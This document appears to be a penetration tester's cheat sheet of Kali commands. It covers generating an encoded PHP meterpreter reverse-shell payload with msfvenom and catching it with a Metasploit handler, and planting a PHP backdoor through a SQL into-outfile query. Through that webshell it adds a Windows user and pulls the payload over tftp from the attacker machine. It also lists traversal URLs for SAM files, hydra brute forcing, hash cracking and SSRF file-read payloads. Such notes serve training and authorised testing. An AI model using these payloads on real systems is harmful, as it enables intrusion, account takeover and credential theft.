[*] Webshells
    root@kali:~# ls /usr/share/webshells/
    asp  aspx  cfm  jsp  laudanum  perl  php  seclists

    root@kali:~# tree /usr/share/webshells/
    /usr/share/webshells/
    ├── asp
    │   ├── cmd-asp-5.1.asp
    │   └── cmdasp.asp
    ├── aspx
    │   └── cmdasp.aspx
    ├── cfm
    │   └── cfexec.cfm
    ├── jsp
    │   ├── cmdjsp.jsp
    │   └── jsp-reverse.jsp
    ├── laudanum -> /usr/share/laudanum
    ├── perl
    │   ├── perlcmd.cgi
    │   └── perl-reverse-shell.pl
    ├── php
    │   ├── findsocket
    │   │   ├── findsock.c
    │   │   └── php-findsock-shell.php
    │   ├── php-backdoor.php
    │   ├── php-reverse-shell.php
    │   ├── qsd-php-backdoor.php
    │   └── simple-backdoor.php
    └── seclists -> /usr/share/seclists/Web-Shells


[*] Metasploit reverse shell workflow 
    GENERATE METASPLOIT PAYLOAD

    root@kali:~# msfvenom --help
    MsfVenom - a Metasploit standalone payload generator.
    Also a replacement for msfpayload and msfencode.
    Usage: /usr/bin/msfvenom [options] <var=val>
    Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe


    root@kali:~# msfvenom -p php/meterpreter/reverse_tcp --list-options
    Options for payload/php/meterpreter/reverse_tcp:
    =========================
    ..
    Basic options:
    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
    LHOST                   yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
    
    Description:
      Run a meterpreter server in PHP. Reverse PHP connect back stager 
      with checks for disabled functions
    ..
    Advanced options for payload/php/meterpreter/reverse_tcp:
    =========================
    
        Name                         Current Setting  Required  Description
        ----                         ---------------  --------  -----------

    root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=1234 --encoder x86/shikata_ga_nai -i 10 --platform php --arch php -o meterpreter.php
    Found 1 compatible encoders
    Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 1141 (iteration=0)
    x86/shikata_ga_nai succeeded with size 1170 (iteration=1)
    x86/shikata_ga_nai succeeded with size 1199 (iteration=2)
    x86/shikata_ga_nai succeeded with size 1228 (iteration=3)
    x86/shikata_ga_nai succeeded with size 1257 (iteration=4)
    x86/shikata_ga_nai succeeded with size 1286 (iteration=5)
    x86/shikata_ga_nai succeeded with size 1315 (iteration=6)
    x86/shikata_ga_nai succeeded with size 1344 (iteration=7)
    x86/shikata_ga_nai succeeded with size 1373 (iteration=8)
    x86/shikata_ga_nai succeeded with size 1402 (iteration=9)
    x86/shikata_ga_nai chosen with final size 1402
    Payload size: 1402 bytes
    Saved as: meterpreter.php



    LISTEN IN METASPLOIT

    msf5 > use exploit/multi/handler 
    msf5 exploit(multi/handler) > set LHOST 192.168.1.8
    LHOST => 192.168.1.7
    msf5 exploit(multi/handler) > set LPORT 1234
    LPORT => 1234

    msf5 exploit(multi/handler) > show advanced 

    Module advanced options (exploit/multi/handler):
    
       Name                    Current Setting  Required  Description
       ----                    ---------------  --------  -----------
       ContextInformationFile                   no        The information file that contains context information
       DisablePayloadHandler   false            no        Disable the handler code for the selected payload
       EnableContextEncoding   false            no        Use transient context when encoding payloads
       ExitOnSession           true             yes       Return from the exploit after a session has been created
       ListenerTimeout         0                no        The maximum number of seconds to wait for new sessions
       VERBOSE                 false            no        Enable detailed status messages
       WORKSPACE                                no        Specify the workspace for this module
       WfsDelay                0                no        Additional delay when waiting for a session

    msf5 exploit(multi/handler) > set ExitOnSession false
    ExitOnSession => false

    msf5 exploit(multi/handler) > help exploit
    Usage: exploit [options]

    Launches an exploitation attempt.

    OPTIONS:

        -J        Force running in the foreground, even if passive.
        -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
        -f        Force the exploit to run regardless of the value of MinimumRank.
        -h        Help banner.
        -j        Run in the context of a job.
        -n <opt>  The NOP generator to use.  If none is specified, NOP is used.
        -o <opt>  A comma separated list of options in VAR=VAL format.
        -p <opt>  The payload to use.  If none is specified, PAYLOAD is used.
        -t <opt>  The target index to use.  If none is specified, TARGET is used.
        -z        Do not interact with the session after successful exploitation.

    msf5 exploit(multi/handler) > exploit -j
    [*] Exploit running as background job 0.
    [*] Exploit completed, but no session was created.

    [*] Started reverse TCP handler on 192.168.1.7:1234 
    msf5 exploit(multi/handler) > 

    msf5 exploit(multi/handler) > jobs

    Jobs
    ====
    
      Id  Name                    Payload                          Payload opts
      --  ----                    -------                          ------------
      0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.1.8:1234

    UPLOAD FILE TO VICTIM TO CREATE REVERSE SHELL


[*] SQL Commands
    phpmyadmin - create backdoor script
        select "<?php system($_GET['cmd']);?>" into outfile "C:\\xampp\\htdocs\\shell.php"
    Limited Webshell
        192.168.1.7/shell.php?cmd=net user thisuser /add #  Successful means we added user "thisuser"
    Create ftp server locally
        atftpd --daemon --bind-address 192.168.1.8 /tmp #  bind this to our localhost
    Webshell msfvenom
        192.168.1.7/shell.php?cmd=tftp 192.168.1.8 get meterpreter.php C:\\xampp\\htdocs\\shell.php #  Move our msfvenom file to the webserver for reverse shell
        192.168.1.7/meterpreter.php #  As long as your metasploit listener is listening, the meterpreter shell should spawn.

[*] Directory Traversal
    Browser traversal
    192.168.1.7/index.html?../../../../../boot.ini
    192.168.1.7/index.html?../../../../../WINDOWS/repair/sam
    192.168.1.7/index.html?../../../../../WINDOWS/repair/system
    192.168.1.7/index.html?../../../../../xampp/FileZillaFtp/FileZilla server.xml


[*] CVE database
    https://www.cvedetails.com
    https://github.com/cve-search/cve-search.git


[*] Windows SAM
    The Windows user passwords are hashed and saved in:
        C:\\Windows\System32\Config\SAM
    They are not accessible when Windows is booted.
    To extract:
        Boot from a Live CD or USB bootable device
        Copy the SAM file locally if possible
        Crack with John the Ripper or Hashcat

[*] Password Cracking - online
    Keep in mind this can create a lockout situation. Bruteforce will trigger alarms.
    Recommended to use this as last case chance. Try offline attacks first if you have hashes.
    hydra
        hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.80 ssh -f
        hydra -l username -P /usr/share/wordlists/rockyou.txt 192.168.1.80 ftp -f

[*] Password Cracking - Offline
    Tools to crack hashes
    John
        Windows hashes - hopefully LM hashes exist, easier to crack
        USERNAME:USERID:LM_HASHED_PASSWORD:LTM_HASHED_PASSWORD
            john hashes.txt
            john --show hashes.txt
            john --format=nt hashes.txt --wordlist=passwords.txt
            john --wordlist=/usr/share/john/password.lst
        Linux hashes
            john linuxhashes.txt
            john linuxhashes.txt --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt
    oclhashcat - GPU version of hashcat.
    hashcat - Use if you are unable to use GPU cracking.
        Rules for hashcat: /usr/share/hashcat/rules/
        hashcat - strip down to just hashed passwords.
            hashcat --help
            hashcat -m 1000 hashed_passwords.txt -o cracked_hashes.txt /usr/share/wordlists/rockyou.txt
            hashcat -m 1000 hashed_passwords.txt -r /usr/share/hashcat/rules/best64.rule -o cracked_hashes.txt /usr/share/wordlists/rockyou.txt
	Wiki to verify your hashes - which algorithm to use
		https://hashcat.net/wiki/doku.php?id=example_hashes
    pipal - Tool for password statistics. What the passwords may be made of.
        pipal hashed_passwords.txt

[*] FTP Server
	nc -lvnp 21
	authbind nc -lvnp 21 #  If elevated perms need to be used
	python -m pyftpdlib -p21 -w

[*] SSRF payloads:
	file:///etc/passwd
	FILE:///etc/passwd
	FiLe:///etc/passwd
